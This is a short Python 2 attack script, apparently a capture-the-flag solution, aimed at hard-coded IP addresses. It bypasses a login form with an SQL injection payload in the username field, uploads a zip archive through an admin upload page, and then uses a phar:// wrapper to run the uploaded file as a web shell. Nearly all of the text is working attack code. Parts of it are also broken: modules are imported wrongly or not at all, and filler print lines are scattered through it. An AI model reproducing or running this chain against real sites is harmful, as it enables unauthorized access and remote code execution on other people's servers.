import sys
import os
import session
reload(sys)
sys.setdefaultencoding('utf-8')

def login(session_req):
	session_req.post('http://123.206.7.206:10002/doLoginUIOPPP.php',
			data={'username': '''admin' or '1'='1'#''', 'password': 'ss'})
	return 'success'

def upload_file(session_req):
	files = {'file': open('D:\PyCharm Community Edition 5.0.3\PycharmProjects\kk.zip', 'rb')}
	html = session_req.post('http://202.120.7.206:5080/admin/admininfile.php?name=upload', files=files).text
	return re.findall('>(.*?.zip)</a', html)[0]

def use_shell(session_req, shell):
	print session_req.get('http://123.206.7.206:10002/admin/admininfile.php?name=phar://../file123asdp/%s/kk' % shell).text

print "nihaonihaonihao"
print "nihaonihaonihao"
print "nihaonihaonihao"
print "nihaonihaonihao"
print "nihaonihaonihao"
print "Mark wu has lots of money"
session = requests.Session()
login(session)
use_shell(session,upload_file(session))
